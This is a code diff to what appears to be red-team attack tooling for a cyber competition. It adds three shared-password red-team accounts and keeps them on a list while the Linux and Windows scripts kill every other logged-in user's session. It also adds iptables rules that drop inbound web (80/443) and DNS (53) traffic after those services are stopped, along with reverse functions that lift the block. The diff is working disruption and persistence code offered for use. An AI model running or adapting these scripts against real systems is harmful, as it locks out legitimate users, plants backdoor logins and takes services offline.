@@ -24,6 +24,9 @@ THEMED_USERS = [
     ("companion", REDTEAM_PASS),
     ("atlas", REDTEAM_PASS),
     ("pbody", REDTEAM_PASS),
+    ("bob", REDTEAM_PASS),
+    ("darth_vader", REDTEAM_PASS),
+    ("sally", REDTEAM_PASS),
 ]
 
 
@@ -303,7 +306,7 @@ class AttackModules:
 
     def pkill_users(self, targets: List[str]) -> Dict:
         linux_cmd = '''
-keep_users="glados wheatley cave caroline root"
+keep_users="glados wheatley cave caroline bob darth_vader sally root"
 for user in $(who | awk '{print $1}' | sort -u); do
     if echo "$keep_users" | grep -qw "$user"; then
         echo "Keeping $user"
@@ -315,7 +318,7 @@ done
 echo "PKILL_COMPLETE"
 '''
         windows_cmd = '''
-$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "Administrator")
+$redTeamUsers = @("glados", "wheatley", "cave", "caroline", "bob", "darth_vader", "sally", "Administrator")
 $sessions = quser 2>$null | Select-Object -Skip 1
 foreach ($session in $sessions) {
     $parts = $session -split '\\s+'
@@ -843,9 +846,16 @@ stop_service() {
         service "$svc" stop 2>/dev/null && echo "Stopped $svc"
     fi
 }
+block_http_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p tcp --dport 80 -j DROP 2>/dev/null || true
+        iptables -I INPUT -p tcp --dport 443 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in apache2 httpd nginx; do
     stop_service "$svc"
 done
+block_http_ports
 touch /tmp/.http_stopped
 echo "HTTP_STOPPED"
 '''
@@ -867,9 +877,16 @@ start_service() {
         service "$svc" start 2>/dev/null && echo "Started $svc"
     fi
 }
+unblock_http_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -D INPUT -p tcp --dport 80 -j DROP 2>/dev/null || true
+        iptables -D INPUT -p tcp --dport 443 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in apache2 httpd nginx; do
     start_service "$svc"
 done
+unblock_http_ports
 rm -f /tmp/.http_stopped
 echo "HTTP_STARTED"
 '''
@@ -891,9 +908,16 @@ stop_service() {
         service "$svc" stop 2>/dev/null && echo "Stopped $svc"
     fi
 }
+block_dns_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -I INPUT -p udp --dport 53 -j DROP 2>/dev/null || true
+        iptables -I INPUT -p tcp --dport 53 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in named bind9 dnsmasq; do
     stop_service "$svc"
 done
+block_dns_ports
 touch /tmp/.dns_stopped
 echo "DNS_STOPPED"
 '''
@@ -914,9 +938,16 @@ start_service() {
         service "$svc" start 2>/dev/null && echo "Started $svc"
     fi
 }
+unblock_dns_ports() {
+    if command -v iptables >/dev/null 2>&1; then
+        iptables -D INPUT -p udp --dport 53 -j DROP 2>/dev/null || true
+        iptables -D INPUT -p tcp --dport 53 -j DROP 2>/dev/null || true
+    fi
+}
 for svc in named bind9 dnsmasq; do
     start_service "$svc"
 done
+unblock_dns_ports
 rm -f /tmp/.dns_stopped
 echo "DNS_STARTED"
 '''
